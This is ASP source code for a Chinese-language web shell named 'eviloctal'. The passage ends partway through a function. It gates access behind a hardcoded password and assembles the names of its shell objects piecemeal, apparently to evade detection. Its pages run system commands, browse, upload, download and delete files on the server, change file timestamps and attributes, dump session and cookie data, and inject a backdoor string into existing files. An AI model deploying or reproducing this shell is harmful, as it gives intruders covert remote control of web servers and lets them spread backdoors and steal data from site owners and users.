<%

	Dim theAct, sTime, aspPath, eviloctal, strBackDoor, fsoX, saX, wsX

	sTime = Timer
	theAct= Request("theAct")
	eviloctal = Request("eviloctal")
	aspPath = Server.MapPath(".")
							
	
	Const m = "eviloctal"	
	Const showLogin = "study"	
	Const clientPassword = "#"
	Const dbSelectNumber = 10
	Const isDebugMode = False
	Const myName = "GET IN"
	Const notdownloadsExists = False
	Const userPassword = "eviloctal"
	Const MyCmdDoTExeFiLe = "cOmmaNd.coM"
	ConSt strJSCloSeMe = "<inPut tYpe=butTon vAluE=' 关闭 ' onClick='wiNdow.cloSe();'>"

	Sub creAteIT(fSoX, SaX, wSX)
		If isDebugMode = False Then
			On Error Resume Next
		End If

		Set fsoX = Server.CreateObject("Scripting.FileSy"&x&"stemObject")
		If IsEmpty(fsoX) And (eviloctal = "FsoFile"&x&"Explorer" Or theAct = "fsoSe"&x&"arch") Then
			Set fsoX = fso
		End If

		Set saX = Server.CreateObject("Shell.Ap"&x&"plication")
		If IsEmpty(saX) And (eviloctal = "AppFileExplorer" Or eviloctal = "Sa"&x&"CmdRun" Or theAct = "saSe"&x&"arch") Then
			Set saX = sa
		End If

		Set wsX = Server.CreateObject("WScrip"&x&"t.Shell")
		If IsEmpty(wsX) And (eviloctal = "WsCm"&x&"dRun" Or theAct = "getTermina"&x&"lInfo" Or theAct = "readR"&x&"eg") Then
			Set wsX = ws
		End If

		If Err Then
			Err.Clear
		End If
	End Sub

	Sub chkErr(Err)
		If Err Then
			echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"
			echo "<br/><font size=2><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><br/>"
			echo "<hr></font>"
			Err.Clear
			Response.End
		End If
	End Sub
	
	Sub echo(str)
		Response.Write(str)
	End Sub
	
	Sub isIn()
		If eviloctal <> "" And eviloctal <> "login" And eviloctal <> showLogin Then
			If Session(m & "userPassword") <> userPassword Then
				Response.End
			End If
		End If
	End Sub
	
	Sub showTitle(str)
		echo "<title>" & str & " </title>" & vbNewLine
		echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine
		echo "" & vbNewLine
		PageOther()
	End Sub
	
	Function fixNull(str)
		If IsNull(str) Then
			str = " "
		End If
		fixNull = str
	End Function
	
	Function encode(str)
		str = Server.HTMLEncode(str)
		str = Replace(str, vbNewLine, "<br>")
		str = Replace(str, " ", "&nbsp;")
		str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
		encode = str
	End Function
	
	Function getTheSize(theSize)
		If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
		If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
		If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
		If theSize >= 0 And theSize <1024 Then getTheSize = theSize & "B"
	End Function
	
	Function HtmlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		UrlEncode = Server.UrlEncode(str)
	End Function
	
	Sub redirectTo(strUrl)
		Response.Redirect(Request.ServerVariables("URL") & strUrl)
	End Sub

	Function trimThePath(strPath)
		If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		trimThePath = strPath
	End Function

	Sub alertThenClose(strInfo)
		Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"
	End Sub

	Sub showErr(str)
		Dim i, arrayStr
		str = Server.HtmlEncode(str)
		arrayStr = Split(str, "$$")
'		Response.Clear
		echo "<font size=2>"
		echo "出错信息:<br/><br/>"
		For i = 0 To UBound(arrayStr)
			echo "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>"
		Next
		echo "</font>"
		Response.End
	End Sub



	isIn()
	
	Call createIt(fsoX, saX, wsX)

	Select Case eviloctal
		Case showLogin, "login"
			PageLogin()
		Case "PageList"
			PageList()
		Case "objOnSrv"
			PageObjOnSrv()
		Case "ServiceList"
			PageServiceList()
		Case "userList"
			PageUserList()
		Case "CSInfo"
			PageCSInfo()
		Case "infoAboutSrv"
			PageInfoAboutSrv()
		Case "AppFileExplorer"
			PageAppFileExplorer()
		Case "SaCmdRun"
			PageSaCmdRun()
		Case "WsCmdRun"
			PageWsCmdRun()
		Case "FsoFileExplorer"
			PageFsoFileExplorer()
		Case "MsDataBase"
			PageMsDataBase()
		Case "OtherTools"
			PageOtherTools()
		Case "TxtSearcher"
			PageTxtSearcher()
		Case "PageAddToMdb"
			PageAddToMdb()
		Case "mycom"
			mycom()
	End Select
	
	Set saX = Nothing
	Set wsX = Nothing
	Set fsoX = Nothing

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	Rem 	下面是各独立功能模块
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

	Sub PageAppFileExplorer()
		Response.Buffer = True
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
		Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath

		showTitle("She"&T&"ll.Appl"&T&"ication文件浏览器(&stream)")

		theAct = Request("theAct")
		strNewName = Request("newName")
		thePath = Replace(LTrim(Request("thePath")), "\\", "\")
		
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Replace(LTrim(Request.Form("thePath")), "\\", "\")
			End If
		End If

		echo "<style>body{margin:8;}</style>"
		
		Select Case theAct
			Case "openUrl"
				openUrl(thePath)
			Case "showEdit"
				Call showEdit(thePath, "stream")
			Case "saveFile"
				Call saveToFile(thePath, "stream")
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m & "appThePath") = thePath
				Session(m & "appTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				appDoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "rename"
				appRenameOne(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "theAttributes"
				appTheAttributes(thePath)
			Case "showUpload"
				Call showUpload(thePath, "AppFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "AppFileExplorer")
			Case "inject"
				strTmp = streamLoadFromFile(thePath)
				fsoSaveToFile thePath, strTmp & strBackDoor
				alertThenClose("插入成功!")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		
		Set objFolder = saX.NameSpace(thePath)
		
		If Request.Form.Count > 0 Then
			redirectTo("?eviloctal=AppFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		echo "<input type=hidden name=usePath /><input type=hidden value=AppFileExplorer name=eviloctal />"
		echo "<input type=hidden value=""" & HtmlEncode(thePath) & """ name=truePath />"
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' 打开 ' onclick='openUrl();'>"
		echo "<input type=button value=' 编辑 ' onclick='editFile();'>"
		echo "<input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne');>"
		echo "<input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "<input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "<input type=button value=' 属性 ' onclick='appTheAttributes();'>"
		echo "<input type=button value=' 插入 ' onclick=appDoAction('inject');>"
		echo "<input type=button value='重命名' onclick='appRename();'>"
		echo "<input type=button value='我的电脑' onclick=location.href='?eviloctal=AppFileExplorer&thePath='>"
		echo "<input type=button value='控制面板' onclick=location.href='?eviloctal=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
		echo "<form method=post action='?eviloctal=AppFileExplorer'>"
		echo "<input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input type=button value=站点根 onclick=location.href=""?eviloctal=AppFileExplorer&thePath=" & URLEncode(Server.MapPath("\")) & """;>"
		echo "<input style='width:60%;' name=thePath value=""" & HtmlEncode(thePath) & """ />"
		echo "<input type=submit value=' GO.' /><input type=button value=' 刷新 ' onclick='location.reload();'></form><hr/>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		For Each objMember In objFolder.Items
			intI = intI + 1
			If intI > 200 Then
				intI = 0
				Response.Flush()
			End If
			
			If objMember.IsFolder = True Then
				If Left(objMember.Path, 2) = "::" Then
					strPath = URLEncode(objMember.Path)
				 Else
					strPath = URLEncode(objMember.Path) & "%5C"
				End If
				strFolderList = strFolderList & "<span id=""" & strPath & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>" & objMember.Name & "</span>"
			 Else
			 	strDetails = objFolder.GetDetailsOf(objMember, -1)
			 	strFilePath = objMember.Path
				strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
				strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
				strFileList = strFileList & "<span title=""" & strDetails & """ ondblclick='openUrl();' id=""" & URLEncode(strFilePath) & """ onclick='changeMyClass(this);'><font class=font face=" & getFileIcon(strExtName) & "</font><br/>" & strFileName & "</span>"
			End If
		Next
		chkErr(Err)

		strParentPath = getParentPath(thePath)
		If thePath <> "" And Left(thePath, 2) <> "::" Then
			strFolderList = "<span id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>" & strFolderList
		End If

		echo "<div id=FileList>"
		echo strFolderList & strFileList
		echo "</div>"
		echo "<hr/>"
		
		Set objFolder = Nothing
	End Sub
	
	Function getParentPath(strPath)
		If Right(strPath, 1) = "\" Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		If Len(strPath) = 2 Then
			getParentPath = " "
		 Else
			getParentPath = Left(strPath, InStrRev(strPath, "\"))
		End If
	End Function

	Function streamSaveToFile(thePath, fileContent)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			chkErr(Err)
			.Charset="gb2312"
			.WriteText fileContent
			.saveToFile thePath, 2
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub appDoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strAct, strPath
		dim objTargetFolder
		strAct = Session(m & "appTheAct")
		strPath = Session(m & "appThePath")
		
		If strAct = "" Or strPath = "" Then
			alertThenClose("参数错误,粘贴前请先复制/剪切!")
			Exit Sub
		End If
		
		If InStr(LCase(thePath), LCase(strPath)) > 0 Then
			alertThenClose("目标文件夹在源文件夹内,非法操作!")
			Exit Sub
		End If

		strPath = trimThePath(strPath)
		thePath = trimThePath(thePath)

		Set objTargetFolder = saX.NameSpace(thePath)
		If strAct = "copyOne" Then
			objTargetFolder.CopyHere(strPath)
		 Else
			objTargetFolder.MoveHere(strPath)
		End If
		chkErr(Err)
		
		Set objTargetFolder = Nothing
	End Sub
	
	Sub appTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, strSth, objFolder, objItem, strModifyDate
		strModifyDate = Request("ModifyDate")
		
		thePath = trimThePath(thePath)

		If thePath = "" Then
			alertThenClose("没有选择任何文件(夹)!")
			Exit Sub
		End If

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)

		If isDate(strModifyDate) Then
			objItem.ModifyDate = strModifyDate
			alertThenClose("修改成功!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
'		strSth = objFolder.GetDetailsOf(objItem, -1)
'		strSth = Replace(strSth, chr(10), "<br/>")
		For i = 1 To 8
			strSth = strSth & "<br/>属性(" & i & "): " & objFolder.GetDetailsOf(objItem, i)
		Next
		strSth = Replace(strSth, "属性(1)", "大小")
		strSth = Replace(strSth, "属性(2)", "类型")
		strSth = Replace(strSth, "属性(3)", "最后修改")
		strSth = Replace(strSth, "属性(8)", "所有者")
		strSth = strSth & "<form method=post>"
		strSth = strSth & "<input type=hidden name=theAct value=theAttributes>"
		strSth = strSth & "<input type=hidden name=thePath value=""" & thePath & """>"
		strSth = strSth & "<br/>最后修改: <input size=30 value='" & objFolder.GetDetailsOf(objItem, 3) & "' name=ModifyDate />"
		strSth = strSth & "<input type=submit value=' 修改 '>"
		strSth = strSth & "</form>"
		echo strSth
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub
	
	Sub appRenameOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strSth, fileName, objItem, objFolder
		fileName = Request("fileName")
		
		thePath = trimThePath(thePath)

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)
		strSth = Split(thePath, ".")(UBound(Split(thePath, ".")))
		
		If fileName <> "" Then
			objItem.Name = fileName
			chkErr(Err)
			alertThenClose("重命名成功,刷新本页可以看到效果!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
		echo "<form method=post>重命名:"
		echo "<input type=hidden name=theAct value=rename>"
		echo "<input type=hidden name=thePath value=""" & thePath & """>"
		echo "<br/><input size=30 value=""" & objItem.Name & """ name=fileName />"
		If InStr(strSth, ":") <= 0 Then
			echo "." & strSth
		End If
		echo "<hr/><input type=submit value=' 修改 '>" & strJsCloseMe
		echo "</form>"
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub

	Sub PageCSInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strKey, strVar, strVariable
		
		showTitle("客户端服务器交互信息")
		
		echo "<a href=javascript:showHideMe(ServerVariables);>ServerVariables:</a>"
		echo "<span id=ServerVariables style='display:none;'>"
		For Each strVariable In Request.ServerVariables
			echo "<li>" & strVariable & ": " & Request.ServerVariables(strVariable) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Application);>Application:</a>"
		echo "<span id=Application style='display:none;'>"
		For Each strVariable In Application.Contents
			echo "<li>" & strVariable & ": " & Encode(Application(strVariable)) & "</li>"
			If Err Then
				For Each strVar In Application.Contents(strVariable)
					echo "<li>" & strVariable & "(" & strVar & "): " & Encode(Application(strVariable)(strVar)) & "</li>"
				Next
				Err.Clear
			End If
		Next
		echo "</span>"

		echo "<br/><a href=javascript:showHideMe(Session);>Session:(ID" & Session.SessionId & ")</a>"
		echo "<span id=Session style='display:none;'>"
		For Each strVariable In Session.Contents
			echo "<li>" & strVariable & ": " & Encode(Session(strVariable)) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Cookies);>Cookies:</a>"
		echo "<span id=Cookies style='display:none;'>"
		For Each strVariable In Request.Cookies
			If Request.Cookies(strVariable).HasKeys Then
				For Each strKey In Request.Cookies(strVariable)
					echo "<li>" & strVariable & "(" & strKey & "): " & HtmlEncode(Request.Cookies(strVariable)(strKey)) & "</li>"
				Next
			 Else
				echo "<li>" & strVariable & ": " & Encode(Request.Cookies(strVariable)) & "</li>"
			End If
		Next
		echo "</span><hr/>"
		
	End Sub

	Sub PageFsoFileExplorer()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Response.Buffer = True
		Dim file, drive, folder, theFiles, theFolder, theFolders
		Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
		
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Request.Form("thePath")
			End If
		End If

		showTitle("FSO文件浏览器(&stream)")
		
		Select Case theAct
			Case "newOne", "doNewOne"
				fsoNewOne(thePath)
			Case "showEdit"
				Call showEdit(thePath, "fso")
			Case "saveFile"
				Call saveToFile(thePath, "fso")
			Case "openUrl"
				openUrl(thePath)
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m & "fsoThePath") = thePath
				Session(m & "fsoTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				fsoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "showFsoRename"
				showFsoRename(thePath)
			Case "doRename"
				Call fsoRename(thePath)
				alertThenClose("重命名成功,刷新后可以看到效果!")
			Case "delOne", "doDelOne"
				showFsoDelOne(thePath)
			Case "getAttributes", "doModifyAttributes"
				fsoTheAttributes(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "showUpload"
				Call showUpload(thePath, "FsoFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "FsoFileExplorer")
			Case "inject"
				Set theFiles = fsoX.OpenTextFile(thePath)
				strTmp = theFiles.ReadAll()
				fsoSaveToFile thePath, strTmp & strBackDoor
				Set theFiles = Nothing
				alertThenClose("插入成功!")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		If Request.Form.Count > 0 Then
			redirectTo("?eviloctal=FsoFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		
		parentFolderName = fsoX.GetParentFolderName(thePath)
		
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' 新建 ' onclick=newOne();>"
		echo "<input type=button value=' 更名 ' onclick=fsoRename();>"
		echo "<input type=button value=' 编辑 ' onclick=editFile();>"
		echo "<input type=button value=' 打开 ' onclick=openUrl();>"
		echo "<input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne')>"
		echo "<input type=button value=' 属性 ' onclick=fsoGetAttributes();>"
		echo "<input type=button value=' 插入 ' onclick=appDoAction('inject');>"
		echo "<input type=button value=' 删除 ' onclick=delOne();>"
		echo "<input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "<input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "<br/>"
		echo "<input type=hidden value=FsoFileExplorer name=eviloctal />"
		echo "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"
		echo "<input type=hidden size=50 name=usePath>"

		echo "<form method=post action=?eviloctal=FsoFileExplorer>"
		If parentFolderName <> "" Then
			echo "<input value='↑向上' type=button onclick=""this.disabled=true;location.href='?eviloctal=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
		End If
		echo "<input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input size=60 value=""" & HtmlEncode(thePath) & """ name=thePath>"
		echo "<input type=submit value=' 转到 '>"
		driveStr = "<option>盘符</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/</option>"
		For Each drive In fsoX.Drives
			driveStr = driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"
		Next
		echo "<input type=button value=' 刷新 ' onclick='location.reload();'> "
		echo "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"
		echo "<hr/></form>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath & " 目录不存在或者不允许访问!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set theFiles = theFolder.Files
		Set theFolders = theFolder.SubFolders

		echo "<div id=FileList>"
		For Each folder In theFolders
			i = i + 1
			If i > 50 Then
				i = 0
				Response.Flush()
			End If
			strTmp = UrlEncode(folder.Path & "\")
			echo "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine
		Next
		Response.Flush()
		For Each file In theFiles
			i = i + 1
			If i > 100 Then
				i = 0
				Response.Flush()
			End If
			echo "<span id='" & UrlEncode(file.Path) & "' title='类型: " & file.Type & vbNewLine & "大小: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fsoX.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine
		Next
		echo "</div>"
		chkErr(Err)
		
		echo "<hr/>"
	End Sub
	
	Sub fsoNewOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theAct, isFile, theName, newAct
		isFile = Request("isFile")
		newAct = Request("newAct")
		theName = Request("theName")

		If newAct = " 确定 " Then
			thePath = Replace(thePath & "\" & theName, "\\", "\")
			If isFile = "True" Then
				Call fsoX.CreateTextFile(thePath, False)
			 Else
				fsoX.CreateFolder(thePath)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!")
			Response.End
		End If
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>新建: "
		echo "<input type=radio name=isFile id=file value='True' checked><label for=file>文件</label> "
		echo "<input type=radio name=isFile id=folder value='False'><label for=folder>文件夹</label><br/>"
		echo "<input size=38 name=theName><hr/>"
		echo "<input type=hidden name=theAct value=doNewOne>"
		echo "<input type=submit name=newAct value=' 确定 '>" & strJsCloseMe
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub fsoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim sessionPath
		sessionPath = Session(m & "fsoThePath")
		
		If thePath = "" Or sessionPath = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If
		
		If Right(thePath, 1) = "\" Then
			thePath = Left(thePath, Len(thePath) - 1)
		End If
		
		If Right(sessionPath, 1) = "\" Then
			sessionPath = Left(sessionPath, Len(sessionPath) - 1)
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			End If
		 Else
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			End If
		End If
		
		chkErr(Err)
	End Sub
	
	Sub fsoRename(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, fileName, theFolder
		fileName = Request("fileName")
		
		If thePath = "" Or fileName = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If

		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			theFolder.Name = fileName
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			theFile.Name = fileName
			Set theFile = Nothing
		End If
		
		chkErr(Err)
	End Sub
	
	Sub showFsoRename(thePath)
		Dim theAct, fileName
		fileName = fsoX.getFileName(thePath)
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>更名为:<br/>"
		echo "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>"
		echo "<input type=submit value=' 确定 '>"
		echo "<input type=hidden name=theAct value=doRename>"
		echo "<input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub showFsoDelOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile
		newAct = Request("newAct")

		If newAct = "确认删除?" Then
			If Right(thePath, 1) = "\" Then
				thePath = Left(thePath, Len(thePath) - 1)
				Call fsoX.DeleteFolder(thePath, True)
			 Else
				Call fsoX.DeleteFile(thePath, True)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!")
			Response.End
		End If

		echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"		
		echo "<form method=post><br/>"
		echo HtmlEncode(thePath)
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doDelOne>"
		echo "<hr/><input type=submit name=newAct value='确认删除?'><input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "</form>"
	End Sub
	
	Sub fsoTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile, theFolder, theTitle
		newAct = Request("newAct")
		
		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFolder)
			End If
				theTitle = getMyTitle(theFolder)
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFile)
			End If
			theTitle = getMyTitle(theFile)
			Set theFile = Nothing
		End If
		
		chkErr(Err)
		theTitle = Replace(theTitle, vbNewLine, "<br/>")
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doModifyAttributes>"
		echo theTitle
		echo "<hr/><input type=submit name=newAct value=' 修改 '>" & strJsCloseMe
		echo "</form>"
	End Sub
	
	Function getMyTitle(theOne)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strTitle
		strTitle = strTitle & "路径: " & theOne.Path & "" & vbNewLine
		strTitle = strTitle & "大小: " & getTheSize(theOne.Size) & vbNewLine
		strTitle = strTitle & "属性: " & getAttributes(theOne.Attributes) & vbNewLine
		strTitle = strTitle & "创建时间: " & theOne.DateCreated & vbNewLine
		strTitle = strTitle & "最后修改: " & theOne.DateLastModified & vbNewLine
		strTitle = strTitle & "最后访问: " & theOne.DateLastAccessed
		getMyTitle = strTitle
	End Function
	
	Sub setMyTitle(theOne)
		Dim i, myAttributes
		
		For i = 1 To Request("attributes").Count
			myAttributes = myAttributes + CInt(Request("attributes")(i))
		Next
		theOne.Attributes = myAttributes
		
		chkErr(Err)
		echo  "<script>alert('该文件(夹)属性已按正确设置修改完成!');</script>"
	End Sub
	
	Function getAttributes(intValue)
		Dim strAtt
		strAtt = "<input type=checkbox name=attributes value=4 {$system}>系统 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>隐藏 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>只读&nbsp;&nbsp;&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=32 {$archive}>存档<br/>　　&nbsp; "
		strAtt = strAtt & "<input type=checkbox name=attributes {$normal} value=0>普通 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>压缩 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=16 {$directory}>文件夹&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=64 {$alias}>快捷方式"
'		strAtt = strAtt & "<input type=checkbox name=attributes value=8 {$volume}>卷标 "
		If intValue = 0 Then
			strAtt = Replace(strAtt, "{$normal}", "checked")
		End If
		If intValue >= 128 Then
			intValue = intValue - 128
			strAtt = Replace(strAtt, "{$compressed}", "checked")
		End If
		If intValue >= 64 Then
			intValue = intValue - 64
			strAtt = Replace(strAtt, "{$alias}", "checked")
		End If
		If intValue >= 32 Then
			intValue = intValue - 32
			strAtt = Replace(strAtt, "{$archive}", "checked")
		End If
		If intValue >= 16 Then
			intValue = intValue - 16
			strAtt = Replace(strAtt, "{$directory}", "checked")
		End If
		If intValue >= 8 Then
			intValue = intValue - 8
			strAtt = Replace(strAtt, "{$volume}", "checked")
		End If
		If intValue >= 4 Then
			intValue = intValue - 4
			strAtt = Replace(strAtt, "{$system}", "checked")
		End If
		If intValue >= 2 Then
			intValue = intValue - 2
			strAtt = Replace(strAtt, "{$hidden}", "checked")
		End If
		If intValue >= 1 Then
			intValue = intValue - 1
			strAtt = Replace(strAtt, "{$readonly}", "checked")
		End If
		getAttributes = strAtt
	End Function

	Sub PageInfoAboutSrv()
		Dim theAct
		theAct = Request("theAct")
		
		showTitle("服务器相关数据")
		
		Select Case theAct
			Case ""
				getSrvInfo()
				getSrvDrvInfo()
				getSiteRootInfo()
				getTerminalInfo()
			Case "getSrvInfo"
				getSrvInfo()
			Case "getSrvDrvInfo"
				getSrvDrvInfo()
			Case "getSiteRootInfo"
				getSiteRootInfo()
			Case "getTerminalInfo"
				getTerminalInfo()
		End Select
		
		echo "<hr/>"
	End Sub

	Sub getSrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
